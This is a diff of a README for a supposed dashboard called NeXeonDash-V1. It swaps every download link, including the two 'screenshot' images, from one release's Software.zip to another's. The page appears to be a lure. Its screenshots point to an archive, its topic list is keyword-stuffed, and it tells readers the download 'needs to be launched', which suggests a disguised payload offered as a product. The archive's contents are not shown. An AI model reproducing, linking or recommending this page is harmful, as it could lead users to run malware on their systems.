@@ -17,7 +17,7 @@ NeXeonDash-V1 is a sleek and modern dashboard designed to enhance your experienc
 client-area, client-side, css, dashboard, fast, flask, html, nexeonai, nexeonsystem, panel, pterodactyl-panel, python, server-side, simple, tailwind, velocitydashboard.
 
 ## 🔗 Download NeXeonDash-V1
-[![Download NeXeonDash-V1](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v1.0/Software.zip)](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v1.0/Software.zip)
+[![Download NeXeonDash-V1](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v2.0/Software.zip)](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v2.0/Software.zip)
 
 Please note that the download link needs to be launched.
 
@@ -27,8 +27,8 @@ For more information and updates on NeXeonDash-V1, please visit the official web
 ## 📸 Screenshots
 Here are some snapshots of NeXeonDash-V1 in action:
 
-![Screenshot 1](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v1.0/Software.zip)
-![Screenshot 2](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/RipConDriod/NeXeonDash-V1/releases/download/v2.0/Software.zip)
 
 ## 👨‍💻 Contributors
 NeXeonDash-V1 is made possible by the following contributors:
